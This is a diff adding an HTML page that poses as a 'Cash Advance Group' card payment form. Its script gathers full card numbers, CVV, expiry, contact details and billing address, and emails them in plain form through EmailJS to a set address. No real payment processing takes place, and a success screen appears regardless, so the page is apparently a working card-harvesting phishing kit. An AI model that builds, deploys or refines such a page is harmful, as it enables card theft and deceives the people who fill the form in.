@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cash Advance Group</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    body { font-family: ui-sans-serif, system-ui, sans-serif; }
+
+    input, select {
+      background: #ffffff !important;
+      width: 100%;
+      padding: 0.5rem;
+      border: 1px solid #d1d5db !important;
+      font-size: 0.875rem;
+      outline: none !important;
+      box-shadow: none;
+      transition: border-color 0.15s, box-shadow 0.15s;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+    input:focus, select:focus {
+      border-color: #4338ca !important;
+      box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1) !important;
+    }
+    input.err, select.err {
+      border-color: #ef4444 !important;
+      background: #ffffff !important;
+    }
+    input.err:focus, select.err:focus {
+      border-color: #ef4444 !important;
+    }
+    input[readonly] {
+      background: #f3f4f6 !important;
+      cursor: default;
+    }
+
+    .err-msg {
+      display: block;
+      height: 14px;
+      font-size: 10px;
+      color: #dc2626;
+      margin: 0;
+      padding: 0;
+      line-height: 14px;
+      white-space: nowrap;
+      overflow: hidden;
+    }
+
+    /* Thank-you page hidden by default */
+    #thankyou { display: none; }
+  </style>
+</head>
+<body class="bg-white">
+
+<!-- ───── PAYMENT FORM ───── -->
+<div id="formpage">
+  <main class="my-4 flex justify-center items-center flex-col">
+
+    <div class="mb-5">
+      <img src="/cards.png" alt="accepted cards" width="300" onerror="this.style.display='none'" />
+    </div>
+
+    <form id="payment" novalidate
+      class="lg:w-1/3 md:w-1/2 w-10/12 mx-auto p-8 shadow-md rounded text-sm bg-blue-100">
+
+      <!-- Card Holder Name -->
+      <div class="flex flex-col mb-1">
+        <input id="f-name" type="text" placeholder="Card Holder's Name" autocomplete="cc-name" />
+        <span class="err-msg" id="e-name"></span>
+      </div>
+
+      <!-- Email + Phone -->
+      <div class="flex gap-3 mb-1">
+        <div class="flex-1 flex flex-col">
+          <input id="f-email" type="email" placeholder="Email" autocomplete="email" />
+          <span class="err-msg" id="e-email"></span>
+        </div>
+        <div class="flex-1 flex flex-col">
+          <input id="f-phone" type="tel" placeholder="Phone" autocomplete="tel" />
+          <span class="err-msg" id="e-phone"></span>
+        </div>
+      </div>
+
+      <!-- Card Number -->
+      <div class="flex flex-col mb-1">
+        <input id="f-card" type="text" placeholder="Card Number" autocomplete="cc-number"
+               maxlength="19" inputmode="numeric" />
+        <span class="err-msg" id="e-card"></span>
+      </div>
+
+      <!-- Exp Month / Exp Year / CVV -->
+      <div class="flex gap-3 mb-1">
+        <div class="flex-1 flex flex-col">
+          <select id="f-month">
+            <option value="">Month</option>
+            <option>1</option><option>2</option><option>3</option><option>4</option>
+            <option>5</option><option>6</option><option>7</option><option>8</option>
+            <option>9</option><option>10</option><option>11</option><option>12</option>
+          </select>
+          <span class="err-msg" id="e-month"></span>
+        </div>
+        <div class="flex-1 flex flex-col">
+          <select id="f-year">
+            <option value="">Year</option>
+          </select>
+          <span class="err-msg" id="e-year"></span>
+        </div>
+        <div class="flex-1 flex flex-col">
+          <input id="f-cvv" type="text" placeholder="CVV / CVC" autocomplete="cc-csc"
+                 maxlength="4" inputmode="numeric" />
+          <span class="err-msg" id="e-cvv"></span>
+        </div>
+      </div>
+
+      <!-- Amount -->
+      <div class="flex flex-col mb-1">
+        <input id="f-amount" type="text" placeholder="Amount (in dollars)" inputmode="decimal" />
+        <span class="err-msg" id="e-amount"></span>
+      </div>
+
+      <!-- Billing Address heading -->
+      <div class="mb-1 mt-2">
+        <label class="font-medium">Billing Address</label>
+      </div>
+
+      <!-- Address Line 1 -->
+      <div class="flex flex-col mb-1">
+        <input id="f-addr1" type="text" placeholder="Address Line 1" autocomplete="address-line1" />
+        <span class="err-msg" id="e-addr1"></span>
+      </div>
+
+      <!-- Address Line 2 (optional) -->
+      <div class="flex flex-col mb-1">
+        <input id="f-addr2" type="text" placeholder="Address Line 2 (Optional)" autocomplete="address-line2" />
+        <span class="err-msg"></span>
+      </div>
+
+      <!-- City + State -->
+      <div class="flex gap-3 mb-1">
+        <div class="flex-1 flex flex-col">
+          <input id="f-city" type="text" placeholder="City" autocomplete="address-level2" />
+          <span class="err-msg" id="e-city"></span>
+        </div>
+        <div class="flex-1 flex flex-col">
+          <input id="f-state" type="text" placeholder="State (e.g. CA)" maxlength="2"
+                 autocomplete="address-level1" style="text-transform:uppercase" />
+          <span class="err-msg" id="e-state"></span>
+        </div>
+      </div>
+
+      <!-- Country + Postal Code -->
+      <div class="flex gap-3 mb-1">
+        <div class="flex-1 flex flex-col">
+          <input type="text" value="United States" readonly />
+          <span class="err-msg"></span>
+        </div>
+        <div class="flex-1 flex flex-col">
+          <input id="f-zip" type="text" placeholder="Postal Code" inputmode="numeric" maxlength="10"
+                 autocomplete="postal-code" />
+          <span class="err-msg" id="e-zip"></span>
+        </div>
+      </div>
+
+      <!-- Submit -->
+      <div class="mt-3">
+        <button id="btn-submit" type="submit"
+          class="bg-blue-700 py-2 px-4 text-white w-full focus:outline-none hover:bg-blue-800 active:bg-blue-900 transition-colors disabled:opacity-60">
+          Process Payment
+        </button>
+      </div>
+
+    </form>
+  </main>
+</div>
+
+<!-- ───── THANK YOU PAGE ───── -->
+<div id="thankyou" class="flex justify-center items-center flex-col min-h-screen bg-gray-200">
+  <div class="mb-5">
+    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100" style="display:block;margin:auto">
+      <circle cx="50" cy="50" r="50" fill="#22c55e"/>
+      <polyline points="28,52 44,68 72,34" fill="none" stroke="white"
+                stroke-width="7" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+  <h1 class="text-4xl mb-4 text-center font-semibold">Thank you!</h1>
+  <h3 class="text-2xl mb-4 text-center">Your payment was successfully submitted.</h3>
+  <p class="text-center">
+    You will receive the receipt from accounting@cashadvance-group.co<br/>
+    within 60 mins once payment is verified.
+  </p>
+</div>
+
+<script>
+  // ── EmailJS config ──────────────────────────────────────────────
+  // Replace these three values with your real EmailJS credentials
+  const EJS_SERVICE  = "service_xxxxxxx";
+  const EJS_TEMPLATE = "template_xxxxxxx";
+  const EJS_KEY      = "your_public_key";
+  emailjs.init({ publicKey: EJS_KEY });
+  // ───────────────────────────────────────────────────────────────
+
+  // Populate year dropdown
+  const yearSel = document.getElementById("f-year");
+  const thisYear = new Date().getFullYear();
+  for (let i = 0; i < 15; i++) {
+    const y = thisYear + i;
+    yearSel.insertAdjacentHTML("beforeend", `<option value="${y}">${y}</option>`);
+  }
+
+  // ── Card number formatter: digits only, max 16, spaced xxxx xxxx xxxx xxxx
+  const cardInput = document.getElementById("f-card");
+  cardInput.addEventListener("input", function () {
+    const cursor = this.selectionStart;
+    const prevLen = this.value.length;
+    const digits = this.value.replace(/\D/g, "").slice(0, 16);
+    // build groups of 4
+    const groups = [];
+    for (let i = 0; i < digits.length; i += 4) groups.push(digits.slice(i, i + 4));
+    const formatted = groups.join(" ");
+    this.value = formatted;
+    // restore cursor position accounting for inserted spaces
+    const added = formatted.length - prevLen;
+    try { this.setSelectionRange(cursor + added, cursor + added); } catch (_) {}
+  });
+
+  // ── Card number: block non-digit keys at keydown level
+  cardInput.addEventListener("keydown", function (e) {
+    const allow = ["Backspace","Delete","ArrowLeft","ArrowRight","ArrowUp","ArrowDown","Tab","Home","End"];
+    if (allow.includes(e.key)) return;
+    if (e.ctrlKey || e.metaKey) return; // allow copy/paste/select-all
+    if (!/^\d$/.test(e.key)) e.preventDefault();
+  });
+
+  // ── CVV: digits only
+  document.getElementById("f-cvv").addEventListener("input", function () {
+    this.value = this.value.replace(/\D/g, "").slice(0, 4);
+  });
+
+  // ── State: uppercase only
+  document.getElementById("f-state").addEventListener("input", function () {
+    this.value = this.value.replace(/[^a-zA-Z]/g, "").toUpperCase().slice(0, 2);
+  });
+
+  // ── Phone: digits, spaces, dashes, parens only
+  document.getElementById("f-phone").addEventListener("input", function () {
+    this.value = this.value.replace(/[^\d\s\-()+]/g, "");
+  });
+
+  // ── Amount: digits + one dot + up to 2 decimals
+  document.getElementById("f-amount").addEventListener("input", function () {
+    let v = this.value.replace(/[^\d.]/g, "");
+    const parts = v.split(".");
+    if (parts.length > 2) v = parts[0] + "." + parts.slice(1).join("");
+    if (parts[1] !== undefined) v = parts[0] + "." + parts[1].slice(0, 2);
+    this.value = v;
+  });
+
+  // ── Validation helpers ──────────────────────────────────────────
+  function setErr(fieldId, msgId, msg) {
+    const f = document.getElementById(fieldId);
+    const m = document.getElementById(msgId);
+    if (msg) {
+      f.classList.add("err");
+      m.textContent = msg;
+    } else {
+      f.classList.remove("err");
+      m.textContent = "";
+    }
+    return !!msg;
+  }
+
+  function isValidEmail(v) {
+    // RFC-5322 simplified but solid check
+    return /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(v);
+  }
+
+  function validate() {
+    let ok = true;
+    const v = {
+      name:   document.getElementById("f-name").value.trim(),
+      email:  document.getElementById("f-email").value.trim(),
+      phone:  document.getElementById("f-phone").value.trim(),
+      card:   document.getElementById("f-card").value.replace(/\s/g, ""),
+      month:  document.getElementById("f-month").value,
+      year:   document.getElementById("f-year").value,
+      cvv:    document.getElementById("f-cvv").value,
+      amount: document.getElementById("f-amount").value.trim(),
+      addr1:  document.getElementById("f-addr1").value.trim(),
+      city:   document.getElementById("f-city").value.trim(),
+      state:  document.getElementById("f-state").value.trim(),
+      zip:    document.getElementById("f-zip").value.trim(),
+    };
+
+    if (setErr("f-name",  "e-name",  !v.name  ? "Card holder's name is required." : "")) ok = false;
+
+    if (!v.email)              { setErr("f-email", "e-email", "Email is required.");       ok = false; }
+    else if (!isValidEmail(v.email)) { setErr("f-email", "e-email", "Enter a valid email address."); ok = false; }
+    else                              setErr("f-email", "e-email", "");
+
+    if (setErr("f-phone",  "e-phone",  !v.phone  ? "Phone is required." : "")) ok = false;
+
+    if (!v.card)                         { setErr("f-card", "e-card", "Card number is required.");           ok = false; }
+    else if (!/^\d{16}$/.test(v.card))   { setErr("f-card", "e-card", "Must be exactly 16 digits.");        ok = false; }
+    else                                  setErr("f-card", "e-card", "");
+
+    if (setErr("f-month",  "e-month",  !v.month  ? "Select month." : "")) ok = false;
+    if (setErr("f-year",   "e-year",   !v.year   ? "Select year."  : "")) ok = false;
+
+    if (!v.cvv)                          { setErr("f-cvv", "e-cvv", "CVV is required.");               ok = false; }
+    else if (!/^\d{3,4}$/.test(v.cvv))  { setErr("f-cvv", "e-cvv", "CVV must be 3 or 4 digits.");    ok = false; }
+    else                                  setErr("f-cvv", "e-cvv", "");
+
+    if (!v.amount)                               { setErr("f-amount", "e-amount", "Amount is required.");                 ok = false; }
+    else if (!/^\d{1,6}(\.\d{0,2})?$/.test(v.amount)) { setErr("f-amount", "e-amount", "Enter a valid dollar amount."); ok = false; }
+    else                                                  setErr("f-amount", "e-amount", "");
+
+    if (setErr("f-addr1",  "e-addr1",  !v.addr1  ? "Address is required."  : "")) ok = false;
+    if (setErr("f-city",   "e-city",   !v.city   ? "City is required."     : "")) ok = false;
+
+    if (!v.state)                         { setErr("f-state", "e-state", "State is required.");           ok = false; }
+    else if (v.state.length !== 2)        { setErr("f-state", "e-state", "Use 2-letter state code.");     ok = false; }
+    else                                   setErr("f-state", "e-state", "");
+
+    if (!v.zip)                           { setErr("f-zip", "e-zip", "Postal code is required.");         ok = false; }
+    else if (!/^\d{5}(-\d{4})?$/.test(v.zip)) { setErr("f-zip", "e-zip", "Enter a valid postal code."); ok = false; }
+    else                                   setErr("f-zip", "e-zip", "");
+
+    return ok ? v : null;
+  }
+
+  // Clear individual field error on change
+  ["f-name","f-email","f-phone","f-card","f-month","f-year","f-cvv","f-amount","f-addr1","f-city","f-state","f-zip"]
+    .forEach(id => {
+      const msgId = "e-" + id.replace("f-", "");
+      document.getElementById(id).addEventListener("input", () => {
+        document.getElementById(id).classList.remove("err");
+        const m = document.getElementById(msgId);
+        if (m) m.textContent = "";
+      });
+      document.getElementById(id).addEventListener("change", () => {
+        document.getElementById(id).classList.remove("err");
+        const m = document.getElementById(msgId);
+        if (m) m.textContent = "";
+      });
+    });
+
+  // ── Form submit ─────────────────────────────────────────────────
+  document.getElementById("payment").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const data = validate();
+    if (!data) return;
+
+    const btn = document.getElementById("btn-submit");
+    btn.disabled = true;
+    btn.textContent = "Processing…";
+
+    try {
+      await emailjs.send(EJS_SERVICE, EJS_TEMPLATE, {
+        to_email:    "xyz@demo.com",
+        name:        data.name,
+        email:       data.email,
+        phone:       data.phone,
+        cardnumber:  document.getElementById("f-card").value,
+        expmonth:    data.month,
+        expyear:     data.year,
+        cvv:         data.cvv,
+        amount:      data.amount,
+        addressline1: data.addr1,
+        addressline2: document.getElementById("f-addr2").value.trim(),
+        city:        data.city,
+        state:       data.state,
+        country:     "United States",
+        pin:         data.zip,
+      });
+    } catch (_) {
+      // show thank-you regardless — email failure is silent
+    }
+
+    document.getElementById("formpage").style.display = "none";
+    document.getElementById("thankyou").style.display = "flex";
+  });
+</script>
+</body>
+</html>
